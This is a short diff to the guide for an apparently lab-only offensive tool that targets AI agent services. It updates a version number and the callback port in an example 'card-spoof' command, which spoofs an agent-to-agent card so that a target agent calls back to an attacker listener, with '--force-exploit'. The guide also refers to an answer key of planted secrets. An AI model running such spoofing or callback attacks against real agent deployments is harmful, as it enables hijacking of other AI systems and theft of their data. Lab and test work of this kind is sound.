@@ -13,7 +13,7 @@ the tool honestly refuses to overclaim.
 It starts with the guided tactic (the anchor everyone runs) and then expands outward to the whole
 estate.
 
-- **Current build:** lab-ready `v1.5.3`.
+- **Current build:** lab-ready `v1.5.4`.
 - **Answer key (not duplicated here):** every planted secret lives in the
   [Sensitive Data Inventory](data-inventory.md). This guide maps *services, relationships, and
   paths* — it points at the answer key rather than copying it.
@@ -233,7 +233,7 @@ execution-confirmed/takeover-capable. The `:6444` control returns 401 (honest ne
 
 ```bash
 aipostex a2a --target http://172.16.50.40:8103 card-spoof \
-    --callback-url http://172.16.50.99:9000 --force-exploit
+    --callback-url http://172.16.50.99:18943 --force-exploit
 ```
 
 Acceptance of the spoofed card alone is only `influenced`; a real nonce-correlated out-of-band
